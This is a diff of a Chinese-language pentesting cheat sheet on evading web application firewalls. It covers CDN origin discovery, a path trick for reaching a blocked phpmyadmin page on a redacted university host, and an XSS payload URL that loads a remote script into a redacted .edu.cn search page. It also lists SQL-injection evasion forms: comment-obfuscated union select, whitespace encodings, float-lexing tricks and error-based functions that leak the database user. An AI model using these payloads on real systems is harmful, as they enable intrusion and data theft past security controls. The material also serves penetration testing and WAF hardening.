@@ -3,36 +3,70 @@
 ---
 
 ## Reference
-- [██大学通用型WAF不完全绕过(持续非定期更新) ](https://drivertom.blogspot.com/2018/12/waf.html)
 - [技术讨论 | 在HTTP协议层面绕过WAF](https://www.freebuf.com/news/193659.html)
 - [利用分块传输吊打所有WAF](https://www.anquanke.com/post/id/169738)
 - [编写Burp分块传输插件绕WAF](http://gv7.me/articles/2019/chunked-coding-converter/)
+- WAF绕过思路 [png](../文件/WAF绕过思路.png)
 
 ---
 
-## 非默认端口导致完全绕过
+## CDN 绕过
 
-测试 HTTPS 服务
-测试 8080/8081 等端口的服务
+1. 域名查询-不是所有域名都解析到CDN说不定有漏网之鱼
+2. DNS历史解析记录查询
 
 ## 路径限制绕过
 
-比如这只 WAF 会对访问敏感路径加以限制,但是加上参数可以绕过。
+比如 WAF 会对访问敏感路径加以限制,但是加上参数可以绕过。
 
 比如想访问 `xxx.██.edu.cn/phpmyadmin/` 会被拦截,访问 `xxx.██.edu.cn/phpmyadmin/?id=1` 可以绕过
 
-## XSS 防护绕过
+## 正则匹配绕过
 
-最直白的 payload 类似 `<script> alert('xss'); </script>`
-但是你可以用 `<script src=来远程加载脚本,并绕过防护`
+**关键字替换**
+
+1. AND 等价于 &&
+2. OR 等价于 ||
+3. = 等价于 like
+4. + 代替 空格
+5. sleep() 等价于 benchmark()
+6. mid()substring() 等价于 substr()
+
+```
+最直白的 payload 类似 `<script> alert('xss'); </script>`,但是你可以用 `<script src=来远程加载脚本,并绕过防护`
 
 `http://██.██.edu.cn/██/██?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`
+```
 
-## SQL 注入绕过
+**注释符绕过**
 
+1. `/**/` 与 `/*!*/` ,还可以代替空格
+2. `select/*@a?v|ddd--n*/xxxxx/*@a?v|ddd--n*/from/*a?v|ddd--n*/xxxx`由于waf解析注释符耗费性能，因此这种方法结合fuzz能找到漏网之鱼
+3. emoji 表情
+4. -- 与 #
+
+```
 Union 注入时 `union select 1 from 2` 替换成 `union/*fuckyou//*a*//*!select*/1/*fuckyou//*a*//*!from*/2`
 
 order by 测试时直接把空格换成 `/**//**/`
+```
+
+**空白符绕过**
+
+1. 正则表达式空白符: %09,%0a,%0b,%0D,%20
+2. mysql空白符: %09,0A,%0b,%0D,%20,%0C,%A0,/**/
+
+**浮点数词法解析**
+
+1. select * from xxx where id=8E0union select 1,2,3,4,5,6,7E0from xxxx
+2. select * from xxx where id=8.0union select 1,2,3,4,5,6,7.0from xxxx
+3. select * from xxx where id=8\Nunion select 1,2,3,4,5,6,7 \Nfrom xxxx
+
+**利用不常用报错函数绕过**
+
+1. select extractvalue(1,concat(1,user()));
+2. select updatexml(1,concat(1,user()),1);
+3. select exp(~(select * from(select user())a));
 
 ## 分段传输
 
